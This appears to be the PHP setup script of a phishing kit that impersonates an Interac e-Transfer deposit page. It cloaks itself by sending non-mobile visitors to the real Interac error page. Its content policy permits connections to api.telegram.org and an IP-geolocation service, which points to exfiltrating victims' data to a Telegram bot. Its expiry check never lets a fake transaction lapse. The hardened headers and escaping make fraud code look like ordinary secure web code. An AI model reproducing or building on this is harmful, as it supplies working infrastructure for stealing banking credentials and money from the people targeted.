<?php
declare(strict_types=1);

// Production environment should not display errors
ini_set('display_errors', '0');
error_reporting(0);

// ================ SECURITY HEADERS & SESSION CONFIG ================

// Secure session cookie parameters
$sessionParams = [
    'lifetime' => 0, // expire when browser closes
    'path' => '/',
    'domain' => $_SERVER['HTTP_HOST'],
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Lax'
];
session_set_cookie_params($sessionParams);
session_name('__Secure-SID');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Regenerate session ID to prevent session fixation
session_regenerate_id(true);

// Generate a cryptographic nonce for CSP
try {
    $cspNonce = bin2hex(random_bytes(16));
} catch (Exception $e) {
    // Fallback for environments where random_bytes is not available
    $cspNonce = bin2hex(openssl_random_pseudo_bytes(16));
}

// Content Security Policy
$csp = "default-src 'self'; " .
       "script-src 'nonce-{$cspNonce}'; " .
       "style-src 'self' 'nonce-{$cspNonce}'; " .
       "img-src 'self' data: https://s3.amazonaws.com; " .
       "connect-src 'self' https://ipapi.co https://api.telegram.org; " .
       "font-src 'self'; " .
       "object-src 'none'; " .
       "base-uri 'self'; " .
       "form-action 'self'; " .
       "frame-ancestors 'none';";

header("Content-Security-Policy: " . $csp);
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');


// ================ MOBILE USER AGENT CHECK ================

$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$isMobile = preg_match('/android|iphone|ipad|ipod|mobile|opera mini|iemobile|blackberry|webos/', $userAgent);

if (!$isMobile) {
    header('Location: https://etransfer.interac.ca/error', true, 302);
    exit;
}


// ================ LOAD CONFIG (OPTIONAL) ================

$root = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/') . '/';
$configFile = $root . 'config/config.php';
$config = is_file($configFile) ? require $configFile : [];


// ================ READ & VALIDATE TRANSACTION SESSION ================

$tx = $_SESSION['transaction_data'] ?? $_SESSION['transaction'] ?? null;

if (!is_array($tx) || empty($tx['transaction_id'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: error.php?reason=session_invalid', true, 302);
    exit;
}


// ================ NORMALIZE DATA ================

$transactionId = (string) ($tx['transaction_id'] ?? '');
$email = (string) ($tx['email'] ?? $tx['recipient_email'] ?? '');
$amountRaw = (string) ($tx['amount'] ?? '0.00');
$amount = number_format((float) preg_replace('/[^\d.]/', '', $amountRaw), 2, '.', '');
$currency = (string) ($tx['currency'] ?? 'CAD');
$status = (string) ($tx['status'] ?? 'Pending');
$sender = (string) ($tx['sender'] ?? $tx['sender_name'] ?? ($config['sendername'] ?? 'System'));
$date = (string) ($tx['date'] ?? date('F j, Y'));


// ================ EXPIRY ENFORCEMENT ================

$defaultExpirySeconds = 30 * 24 * 60 * 60; // 30 days
$expiresTs = 0;
if (isset($tx['expires']) && is_numeric($tx['expires'])) {
    $expiresTs = (int) $tx['expires'];
} elseif (!empty($tx['expiry_date'])) {
    $expiresTs = strtotime($tx['expiry_date']);
    $expiresTs = ($expiresTs === false) ? 0 : $expiresTs;
}

if ($expiresTs <= time()) {
    $expiresTs = time() + $defaultExpirySeconds;
}

if (time() > $expiresTs) {
    $_SESSION = [];
    session_destroy();
    header('Location: error.php?reason=expired', true, 302);
    exit;
}

$expiryDateHuman = date('F j, Y', $expiresTs);


// ================ CANONICAL SESSION STORAGE ================

// Consolidate into a single, canonical session key
$_SESSION['transaction_data'] = [
    'transaction_id' => $transactionId,
    'email'          => $email,
    'amount'         => $amount,
    'currency'       => $currency,
    'status'         => $status,
    'expires'        => $expiresTs,
    'sender'         => $sender,
    'date'           => $date,
];
// Unset the old key if it exists to avoid confusion
unset($_SESSION['transaction']);


// ================ SAFE OUTPUT VARIABLES for index.php template ================

$senderName  = htmlspecialchars($sender, ENT_QUOTES, 'UTF-8');
$expiry      = htmlspecialchars($expiryDateHuman, ENT_QUOTES, 'UTF-8');
$idId        = htmlspecialchars($transactionId, ENT_QUOTES, 'UTF-8');
$amountEsc   = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$emailEsc    = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
$statusEsc   = htmlspecialchars($status, ENT_QUOTES, 'UTF-8');
$currencyEsc = htmlspecialchars($currency, ENT_QUOTES, 'UTF-8');

// The session is now clean and ready for the view to use.
session_write_close();
?>
